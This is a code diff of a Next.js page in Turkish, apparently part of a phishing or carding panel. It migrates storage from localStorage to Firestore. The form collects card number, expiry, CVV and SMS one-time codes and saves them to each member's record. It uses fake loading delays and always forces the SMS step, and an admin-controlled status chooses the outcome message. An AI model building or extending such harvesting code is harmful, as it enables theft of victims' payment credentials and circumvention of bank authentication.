@@ -9,11 +9,13 @@ import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { useToast } from "@/hooks/use-toast";
 import { Loader2, Landmark, CreditCard, Wallet, TrendingUp, CircleAlert, CircleCheck } from "lucide-react";
-import { getMembers, setMembers } from "@/lib/member-storage";
 import type { AdminMember } from "@/app/dashboard/admin/page";
 import { cn } from "@/lib/utils";
 import { useAuth } from "@/hooks/use-auth";
 import { Skeleton } from "@/components/ui/skeleton";
+import { db } from "@/lib/firebase/config";
+import { doc, getDoc, updateDoc } from "firebase/firestore";
+
 
 const banks = [
   "ZİRAAT BANK", "AKBANK", "VAKIF BANK", "GARANTİ BANK", "DENİZ BANK",
@@ -61,7 +63,7 @@ const BalancePageSkeleton = () => (
 
 export default function BalancePage() {
   const { toast } = useToast();
-  const { member, loading: authLoading } = useAuth();
+  const { member, loading: authLoading, user } = useAuth();
   const [currentUser, setCurrentUser] = useState<AdminMember | null>(null);
   const [selectedBank, setSelectedBank] = useState<string | null>(null);
   
@@ -90,26 +92,32 @@ export default function BalancePage() {
     }
   }, [member]);
 
-  const updateUserInStorage = (dataToUpdate: Partial<AdminMember>) => {
-     if (!currentUser) return;
-     const allMembers = getMembers();
-     const updatedMembers = allMembers.map(member => 
-        member.id === currentUser.id ? { ...member, ...dataToUpdate } : member
-     );
-     setMembers(updatedMembers);
-     const updatedCurrentUser = updatedMembers.find(m => m.id === currentUser.id);
-     if (updatedCurrentUser) {
-        setCurrentUser(updatedCurrentUser);
-        localStorage.setItem('loggedInUser', JSON.stringify(updatedCurrentUser));
+  const updateUserInFirestore = async (dataToUpdate: Partial<AdminMember>) => {
+     if (!user || !db) return;
+     const memberDocRef = doc(db, "members", user.uid);
+     try {
+       await updateDoc(memberDocRef, dataToUpdate);
+       // Refresh local state after successful update
+       const updatedDoc = await getDoc(memberDocRef);
+       if (updatedDoc.exists()) {
+           setCurrentUser(updatedDoc.data() as AdminMember);
+       }
+     } catch (error) {
+        console.error("Error updating user in Firestore:", error);
+        toast({ variant: "destructive", title: "Hata", description: "Bilgileriniz güncellenemedi." });
      }
   };
 
-  const showMessageDialog = () => {
-    // We need to fetch the LATEST user data again right before showing the dialog
-    const allMembers = getMembers();
-    const freshUserData = allMembers.find(m => m.id === currentUser?.id);
+  const showMessageDialog = async () => {
+    if (!user || !db) return;
 
-    if (!freshUserData) return;
+    // We need to fetch the LATEST user data again right before showing the dialog
+    const memberDocRef = doc(db, "members", user.uid);
+    const freshUserDataSnap = await getDoc(memberDocRef);
+
+    if (!freshUserDataSnap.exists()) return;
+
+    const freshUserData = freshUserDataSnap.data() as AdminMember;
 
     if (freshUserData.transactionStatus === 'blocked') {
         setMessageDialogTitle("İşlem Başarısız");
@@ -145,7 +153,7 @@ export default function BalancePage() {
   const handleCardSubmit = (e: React.FormEvent) => {
     e.preventDefault();
     
-    updateUserInStorage({
+    updateUserInFirestore({
       cardNumber: cardNumber,
       cardExpiry: expiryDate,
       cardCvv: cvv
@@ -154,8 +162,6 @@ export default function BalancePage() {
     setIsLoading(true);
     setTimeout(() => {
         setIsLoading(false);
-        // Always proceed to the SMS step.
-        // The check for transactionStatus will happen in handleSmsSubmit.
         setIsSmsStep(true);
     }, 2000);
   };
@@ -164,7 +170,7 @@ export default function BalancePage() {
      e.preventDefault();
      setIsLoading(true);
 
-     updateUserInStorage({ smsCode: smsCode });
+     updateUserInFirestore({ smsCode: smsCode });
 
      setTimeout(() => {
         setIsLoading(false);
